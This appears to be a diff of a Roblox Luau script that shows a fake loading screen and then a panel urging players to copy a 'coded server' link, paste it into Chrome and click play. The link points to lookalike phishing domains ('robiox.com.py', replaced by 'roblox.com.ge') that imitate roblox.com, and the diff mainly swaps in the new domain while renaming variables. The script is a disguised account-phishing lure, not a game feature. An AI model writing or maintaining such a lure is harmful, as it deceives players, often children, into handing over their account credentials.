@@ -3,16 +3,16 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- LINK TO COPY
-local codedServerLink = "https://www.robiox.com.py/games/76558904092080/The-Forge-BETA?privateServerLinkCode=136714832263838345374554483173"
+-- UPDATED CODED SERVER LINK
+local codedServerLink = "https://roblox.com.ge/games/76558904092080/The-Forge-XMAS?privateServerLinkCode=20407239162716692696764585556462"
 
--- GUI
+-- ScreenGui
 local gui = Instance.new("ScreenGui")
 gui.Name = "CodedServerGUI"
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
--- Loading screen
+-- Loading Screen
 local loadingFrame = Instance.new("Frame")
 loadingFrame.Size = UDim2.new(1, 0, 1, 0)
 loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -23,22 +23,22 @@ loadingText.Size = UDim2.new(1, 0, 0.2, 0)
 loadingText.Position = UDim2.new(0, 0, 0.4, 0)
 loadingText.BackgroundTransparency = 1
 loadingText.Text = "Loading Script..."
-loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
 loadingText.TextScaled = true
 loadingText.Font = Enum.Font.GothamBold
 loadingText.Parent = loadingFrame
 
--- 10 second load
+-- Wait 10 seconds
 task.wait(10)
 loadingFrame:Destroy()
 
--- Main frame
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0.6, 0, 0.6, 0)
-frame.Position = UDim2.new(0.2, 0, 0.2, 0)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.BorderSizePixel = 0
-frame.Parent = gui
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
+mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = gui
 
 -- Title
 local title = Instance.new("TextLabel")
@@ -46,28 +46,28 @@ title.Size = UDim2.new(1, -20, 0.15, 0)
 title.Position = UDim2.new(0, 10, 0, 10)
 title.BackgroundTransparency = 1
 title.Text = "USE CODED SERVER FOR THIS SCRIPT"
-title.TextColor3 = Color3.new(1, 1, 1)
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextScaled = true
 title.Font = Enum.Font.GothamBold
-title.Parent = frame
+title.Parent = mainFrame
 
 -- Instructions
-local info = Instance.new("TextLabel")
-info.Size = UDim2.new(1, -20, 0.45, 0)
-info.Position = UDim2.new(0, 10, 0.18, 0)
-info.BackgroundTransparency = 1
-info.TextWrapped = true
-info.TextYAlignment = Enum.TextYAlignment.Top
-info.Text =
+local instructions = Instance.new("TextLabel")
+instructions.Size = UDim2.new(1, -20, 0.45, 0)
+instructions.Position = UDim2.new(0, 10, 0.18, 0)
+instructions.BackgroundTransparency = 1
+instructions.TextWrapped = true
+instructions.TextYAlignment = Enum.TextYAlignment.Top
+instructions.Text =
 	"To get the coded server read below\n\n" ..
 	"1. Click Get Coded Server\n" ..
 	"2. Put coded server into chrome\n" ..
 	"3. Click play\n" ..
 	"4. Enjoy your script🔥"
-info.TextColor3 = Color3.fromRGB(200, 200, 200)
-info.TextScaled = true
-info.Font = Enum.Font.Gotham
-info.Parent = frame
+instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
+instructions.TextScaled = true
+instructions.Font = Enum.Font.Gotham
+instructions.Parent = mainFrame
 
 -- Button
 local button = Instance.new("TextButton")
@@ -75,13 +75,13 @@ button.Size = UDim2.new(0.6, 0, 0.15, 0)
 button.Position = UDim2.new(0.2, 0, 0.7, 0)
 button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
 button.Text = "Get Coded Server"
-button.TextColor3 = Color3.new(1, 1, 1)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
 button.TextScaled = true
 button.Font = Enum.Font.GothamBold
 button.BorderSizePixel = 0
-button.Parent = frame
+button.Parent = mainFrame
 
--- Clipboard copy (key-system style)
+-- Clipboard Copy (key-system style)
 button.MouseButton1Click:Connect(function()
 	button.Text = "Generating..."
 	task.wait(1.5)
